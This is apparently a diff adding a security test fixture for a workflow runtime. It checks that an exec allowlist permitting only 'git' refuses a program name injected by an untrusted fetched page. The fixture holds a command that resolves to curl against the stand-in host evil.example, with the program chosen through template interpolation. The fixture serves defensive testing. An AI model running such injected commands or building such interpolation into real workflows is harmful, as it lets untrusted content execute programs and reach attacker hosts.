@@ -1,0 +1,21 @@
+# F4 — permit escalation: permits.exec allowlists `git` only, and the
+# untrusted page supplies the PROGRAM NAME through interpolation. The
+# rendered argv[0] is `curl` — outside the allowlist — so the runtime gate
+# refuses after template resolution but before spawn (NIKA-SEC-004). The
+# static lane is blind here by design: the program name is dynamic.
+nika: v1
+workflow:
+  id: f4-02-program-outside-allowlist
+permits:
+  exec: ["git"]
+  net: { http: ["news.example"] }
+  tools: ["nika:fetch"]
+tasks:
+  fetch_page:
+    invoke:
+      tool: "nika:fetch"
+      args: { url: "https://news.example/tool.txt" }
+  run_it:
+    after: { fetch_page: succeeded }
+    with: { prog: "${{ tasks.fetch_page.output }}" }
+    exec: { command: ["${{ with.prog }}", "-s", "https://evil.example/x"] }
